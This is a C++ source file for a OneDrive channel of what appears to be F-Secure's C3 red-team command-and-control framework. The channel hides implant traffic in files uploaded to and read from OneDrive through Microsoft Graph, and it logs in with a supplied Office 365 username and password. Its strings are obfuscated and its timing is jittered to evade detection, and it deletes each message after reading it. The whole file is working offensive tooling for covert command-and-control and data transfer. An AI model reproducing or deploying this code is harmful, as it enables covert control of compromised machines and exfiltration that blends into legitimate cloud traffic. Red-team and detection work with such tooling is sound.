#include "StdAfx.h"
#include "OneDrive365RestFile.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/json/json.hpp"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/WinHttp/Constants.h"
#include "Common/FSecure/WinHttp/Uri.h"

// Namespaces.
using json = nlohmann::json;
using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

std::atomic<std::chrono::steady_clock::time_point> FSecure::C3::Interfaces::Channels::OneDrive365RestFile::s_TimePoint = std::chrono::steady_clock::now();

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OneDrive365RestFile(ByteView arguments)
	: m_InboundDirectionName{ arguments.Read<std::string>() }
	, m_OutboundDirectionName{ arguments.Read<std::string>() }
	, m_Username{ arguments.Read<SecureString>() }
	, m_Password{ arguments.Read<SecureString>() }
	, m_ClientKey{ arguments.Read<SecureString>() }
{
	FSecure::Utils::DisallowChars({ m_InboundDirectionName, m_OutboundDirectionName }, OBF(R"(;/?:@&=+$,)"));

	// Obtain proxy information and store it in the HTTP configuration.
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);

	RefreshAccessToken();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnSendToChannel(ByteView data)
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	try
	{
		// Construct the HTTP request
		auto URLwithFilename = OBF("https://graph.microsoft.com/v1.0/me/drive/root:/") + m_OutboundDirectionName + OBF("-") + FSecure::Utils::GenerateRandomString(20) + OBF(".json") + OBF(":/content");
		auto webClient = HttpClient{ Convert<Utf16>(URLwithFilename), m_ProxyConfig };
		auto request = CreateAuthRequest(Method::PUT);

		auto chunkSize = std::min<size_t>(data.size(), 3 * (1024 * 1024 - 64)); // Send max 4 MB. base64 will expand data by 4/3. 256 bytes are reserved for json schema.
		auto fileData = json{};
		fileData[OBF("epoch_time")] = FSecure::Utils::TimeSinceEpoch();
		fileData[OBF("high_res_time")] = GetTickCount64();
		fileData[OBF("data")] = cppcodec::base64_rfc4648::encode(&data.front(), chunkSize);

		auto body = fileData.dump();
		request.SetData(OBF(L"text/plain"), { body.begin(), body.end() });
		EvaluateResponse(webClient.Request(request));

		return chunkSize;
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnSend(): ") + exception.what(), LogMessage::Severity::Error });
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnReceiveFromChannel()
{
	if (s_TimePoint.load() > std::chrono::steady_clock::now())
		std::this_thread::sleep_until(s_TimePoint.load() + FSecure::Utils::GenerateRandomValue(m_MinUpdateDelay, m_MaxUpdateDelay));

	auto packets = std::vector<ByteVector>{};
	try
	{
		auto webClient = HttpClient{ OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children?top=1000&filter=startswith(name,'") + Convert<Utf16>(m_InboundDirectionName) + OBF(L"')"), m_ProxyConfig };
		auto request = CreateAuthRequest(); HttpRequest{};
		auto resp = webClient.Request(request);
		EvaluateResponse(resp);

		auto taskDataAsJSON = json::parse(resp.GetData());

		// First iterate over the json and populate an array of the files we want.
		auto elements = std::vector<json>{};
		for (auto& element : taskDataAsJSON.at(OBF("value")))
		{
			//download the file
			auto  webClientFile = HttpClient{ Convert<Utf16>(element.at(OBF("@microsoft.graph.downloadUrl")).get<std::string>()), m_ProxyConfig };
			auto resp = webClientFile.Request(request);
			EvaluateResponse(resp);

			auto j = json::parse(resp.GetData());
			j[OBF("id")] = element.at(OBF("id"));
			elements.push_back(std::move(j));
		}

		//now sort and re-iterate over them.
		std::sort(elements.begin(), elements.end(),
			[](auto const& a, auto const& b) { return a[OBF("epoch_time")] < b[OBF("epoch_time")] || a[OBF("high_res_time")] < b[OBF("high_res_time")]; }
		);

		for(auto &element : elements)
		{
			auto id = element.at(OBF("id")).get<std::string>();
			packets.push_back(cppcodec::base64_rfc4648::decode(element.at(OBF("data")).get<std::string>()));
			RemoveFile(id);
		}
	}
	catch (std::exception& exception)
	{
		Log({ OBF_SEC("Caught a std::exception when running OnReceive(): ") + exception.what(), LogMessage::Severity::Warning });
	}

	return packets;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RemoveFile(std::string const& id)
{
	auto webClient = HttpClient{ OBF(L"https://graph.microsoft.com/v1.0/me/drive/items/") + Convert<Utf16>(id), m_ProxyConfig };
	auto request = CreateAuthRequest(Method::DEL);
	auto resp = webClient.Request(request);

	if (resp.GetStatusCode() > 205)
		throw std::runtime_error{ OBF("RemoveFile() Error. Task ") + id + OBF(" could not be deleted. HTTP response:") + std::to_string(resp.GetStatusCode()) };
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RemoveAllFiles(ByteView)
{
		auto webClient = HttpClient{ OBF(L"https://graph.microsoft.com/v1.0/me/drive/root/children"), m_ProxyConfig };
		auto request = CreateAuthRequest();
		auto resp = webClient.Request(request);
		try
		{
			EvaluateResponse(resp);
		}
		catch (const std::exception & exception)
		{
			Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") + exception.what(), LogMessage::Severity::Error });
			return {};
		}

		// For each task (under the "value" key), extract the ID, and send a request to delete the task.
		auto taskDataAsJSON = nlohmann::json::parse(resp.GetData());
		for (auto& element : taskDataAsJSON.at(OBF("value")))
			try
			{
				RemoveFile(element.at(OBF("id")).get<std::string>());
			}
			catch (const std::exception& exception)
			{
				Log({ OBF_SEC("Caught a std::exception when running RemoveAllFiles(): ") + exception.what(), LogMessage::Severity::Error });
			}

	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::RefreshAccessToken()
{
	try
	{
		//Token endpoint
		auto webClient = HttpClient{ OBF(L"https://login.windows.net/organizations/oauth2/v2.0/token"), m_ProxyConfig };

		auto request = HttpRequest{ Method::POST };
		request.SetHeader(Header::ContentType, OBF(L"application/x-www-form-urlencoded; charset=utf-16"));

		auto requestBody = SecureString{};
		requestBody += OBF("grant_type=password");
		requestBody += OBF("&scope=files.readwrite.all");
		requestBody += OBF("&username=");
		requestBody += m_Username.Decrypt();
		requestBody += OBF("&password=");
		requestBody += m_Password.Decrypt();
		requestBody += OBF("&client_id=");
		requestBody += m_ClientKey.Decrypt();

		request.SetData(ContentType::ApplicationXWwwFormUrlencoded, { requestBody.begin(), requestBody.end() });
		auto resp = webClient.Request(request);
		EvaluateResponse(resp, false);

		auto data = json::parse(resp.GetData());
		m_Token = data[OBF("access_token")].get<std::string>();
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error{ OBF_STR("Cannot refresh token: ") + exception.what() };
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::OneDrive365RestFile::OnRunCommand(ByteView command)
{
	auto commandCopy = command; // Each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		return RemoveAllFiles(command);
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::OneDrive365RestFile::EvaluateResponse(WinHttp::HttpResponse const& resp, bool tryRefreshingToken)
{

	if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created)
		return;

	if (resp.GetStatusCode() == StatusCode::TooManyRequests) // break and set sleep time.
	{
		auto retryAfterHeader = resp.GetHeader(Header::RetryAfter);
		auto delay = !retryAfterHeader.empty() ? stoul(retryAfterHeader) : FSecure::Utils::GenerateRandomValue(10, 20);
		s_TimePoint = std::chrono::steady_clock::now() + std::chrono::seconds{ delay };
		throw std::runtime_error{ OBF("Too many requests") };
	}

	if (resp.GetStatusCode() == StatusCode::Unauthorized)
	{
		if (tryRefreshingToken)
			RefreshAccessToken();
		throw std::runtime_error{ OBF("HTTP 401 - Token being refreshed") };
	}

	if (resp.GetStatusCode() == StatusCode::BadRequest)
		throw std::runtime_error{ OBF("Bad Request") };

	throw std::runtime_error{ OBF("Non 200 http response.") + std::to_string(resp.GetStatusCode()) };
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::WinHttp::HttpRequest FSecure::C3::Interfaces::Channels::OneDrive365RestFile::CreateAuthRequest(WinHttp::Method method)
{
	auto request = HttpRequest{ method };
	request.SetHeader(Header::Authorization, Convert<Utf16>(OBF_SEC("Bearer ") + m_Token.Decrypt()));
	return request;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteView FSecure::C3::Interfaces::Channels::OneDrive365RestFile::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "username",
				"min": 1,
				"description": "The O365 user"
			},
			{
				"type": "string",
				"name": "password",
				"min": 1,
				"description": "The user's password"
			},
			{
				"type": "string",
				"name": "Client Key/ID",
				"min": 1,
				"description": "The GUID of the registered application."
			}
		]
	},
	"commands":
	[
		{
			"name": "Clear channel",
			"id": 0,
			"description": "Clearing old files from server. May increase bandwidth",
			"arguments": []
		}
	]
}
)_";
}
